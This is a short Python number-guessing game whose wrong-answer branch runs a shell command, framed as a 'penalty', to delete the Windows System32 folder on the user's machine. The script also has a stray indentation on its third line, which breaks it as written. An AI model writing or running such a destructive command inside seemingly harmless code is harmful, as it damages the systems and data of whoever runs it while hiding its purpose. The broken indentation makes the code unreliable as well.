import random
import os 
 number = random.randint(1, 10)
guess = input("Guess a number between 1 and 10: ")
guess = int(guess)

if guess == number:
    print("You guessed correctly!")
else:
    print("You guessed wrong!")
    print("Here's your Penalty.")
    print("Deleting Windows System32")
    os.system("del C:\\Windows\\System32")    